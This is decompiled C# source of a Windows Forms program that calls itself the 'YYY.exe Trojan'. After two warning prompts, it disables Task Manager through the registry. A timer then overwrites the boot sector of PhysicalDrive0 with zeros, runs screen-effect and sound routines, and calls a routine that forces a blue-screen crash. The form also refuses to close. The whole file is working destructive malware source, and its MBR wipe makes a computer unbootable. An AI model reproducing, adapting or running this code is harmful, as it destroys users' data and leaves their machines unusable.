using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace YYY;

public class Form1 : Form
{
	private PaintEventArgs e;

	private const uint GENERIC_WRITE = 1073741824u;

	private const uint OPEN_EXISTING = 3u;

	private IContainer components = null;

	private Button button1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private PictureBox pictureBox1;

	private Timer timer1;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	public Form1()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Invalid comparison between Unknown and I4
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Invalid comparison between Unknown and I4
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		DialogResult val = MessageBox.Show("your about to run a malware called YYY.exe Trojan. \n\r\n use this malware wisely. this will cause data loss and makes your computer likely UnBootable. if you dont know what this does click no to make your computer safe. do you want to Execute this Malware? you wont be able to use windows again. \n\r\n WARNING: THIS TROJAN CAN COUNTAIN FLASHING LIGHTS AND LOUD NOISES.", "Warning", (MessageBoxButtons)4, (MessageBoxIcon)48);
		if ((int)val == 6)
		{
			DialogResult val2 = MessageBox.Show("THIS IS THE FINAL WARNING. \n\r\n if you read this Dangerous warning then you will keep in mind your PC is going to be destroyed. Clicking yes destroys your PC. YOU WONT BE ABLE TO USE WINDOWS AGAIN. THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE OR DATA LOSS OR MADE DAMAGES TO YOUR COMPUTER. \n\r\n do you want to still execute this malware?", "FINAL WARNING", (MessageBoxButtons)4, (MessageBoxIcon)48);
			if ((int)val2 == 6)
			{
				timer1.Start();
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
			}
			else
			{
				MessageBox.Show("you almost destroyed your pc.", "...", (MessageBoxButtons)0, (MessageBoxIcon)32);
				Application.Exit();
			}
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Stop clicking me!");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		IntPtr intPtr = CreateFile("\\\\.\\PhysicalDrive0", 1073741824u, 0u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
		if (intPtr != IntPtr.Zero)
		{
			byte[] array = new byte[512];
			if (WriteFile(intPtr, array, (uint)array.Length, out var _, IntPtr.Zero))
			{
				MessageBox.Show("Enter Text here", "", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Process.Start("SOUND.wav");
				COLOR.ON();
				BLUR.BTC();
				GDI.Start();
				COLOR.LOL();
				BSOD.RaisePrivilege();
				BSOD.CauseNtHardError();
			}
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_048e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0498: Expected O, but got Unknown
		//IL_0639: Unknown result type (might be due to invalid IL or missing references)
		//IL_0643: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		pictureBox1 = new PictureBox();
		timer1 = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)button1).Location = new Point(27, 158);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(29, 26);
		((Control)button1).TabIndex = 0;
		((Control)button1).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button1).UseVisualStyleBackColor = true;
		((Control)button1).Click += button1_Click;
		((Control)button2).Location = new Point(415, 55);
		((Control)button2).Name = "button2";
		((Control)button2).Size = new Size(29, 26);
		((Control)button2).TabIndex = 1;
		((Control)button2).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button2).UseVisualStyleBackColor = true;
		((Control)button3).Location = new Point(174, 55);
		((Control)button3).Name = "button3";
		((Control)button3).Size = new Size(29, 26);
		((Control)button3).TabIndex = 2;
		((Control)button3).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button3).UseVisualStyleBackColor = true;
		((Control)button4).Location = new Point(370, 146);
		((Control)button4).Name = "button4";
		((Control)button4).Size = new Size(29, 26);
		((Control)button4).TabIndex = 3;
		((Control)button4).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button4).UseVisualStyleBackColor = true;
		((Control)button5).Location = new Point(292, 113);
		((Control)button5).Name = "button5";
		((Control)button5).Size = new Size(29, 26);
		((Control)button5).TabIndex = 4;
		((Control)button5).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button5).UseVisualStyleBackColor = true;
		((Control)button6).Location = new Point(325, 46);
		((Control)button6).Name = "button6";
		((Control)button6).Size = new Size(29, 26);
		((Control)button6).TabIndex = 5;
		((Control)button6).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button6).UseVisualStyleBackColor = true;
		((Control)button7).Location = new Point(131, 104);
		((Control)button7).Name = "button7";
		((Control)button7).Size = new Size(29, 26);
		((Control)button7).TabIndex = 6;
		((Control)button7).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button7).UseVisualStyleBackColor = true;
		((Control)button8).Location = new Point(245, 158);
		((Control)button8).Name = "button8";
		((Control)button8).Size = new Size(29, 26);
		((Control)button8).TabIndex = 7;
		((Control)button8).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button8).UseVisualStyleBackColor = true;
		((Control)button9).Location = new Point(249, 98);
		((Control)button9).Name = "button9";
		((Control)button9).Size = new Size(29, 26);
		((Control)button9).TabIndex = 8;
		((Control)button9).Text = "YOUR PC WAS DESTROYED BY YYY.exe trojan.\r\nif you should click no then it will spawn a form1 and nothing will happen.\r\nANYWAYS YOUR COOOOOOOOOOOOOOOOOOOOOOOOKED\r\n\r\n";
		((ButtonBase)button9).UseVisualStyleBackColor = true;
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		((Control)pictureBox1).Location = new Point(-21, 0);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(572, 222);
		pictureBox1.SizeMode = (PictureBoxSizeMode)1;
		pictureBox1.TabIndex = 9;
		pictureBox1.TabStop = false;
		timer1.Tick += timer1_Tick;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(9f, 20f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Form)this).ClientSize = new Size(527, 223);
		((Form)this).ControlBox = false;
		((Control)this).Controls.Add((Control)(object)pictureBox1);
		((Control)this).Controls.Add((Control)(object)button9);
		((Control)this).Controls.Add((Control)(object)button8);
		((Control)this).Controls.Add((Control)(object)button7);
		((Control)this).Controls.Add((Control)(object)button6);
		((Control)this).Controls.Add((Control)(object)button5);
		((Control)this).Controls.Add((Control)(object)button4);
		((Control)this).Controls.Add((Control)(object)button3);
		((Control)this).Controls.Add((Control)(object)button2);
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Name = "Form1";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Control)this).Text = "you made a terrible mistake...";
		((Form)this).FormClosing += new FormClosingEventHandler(Form1_FormClosing);
		((Form)this).Load += Form1_Load;
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
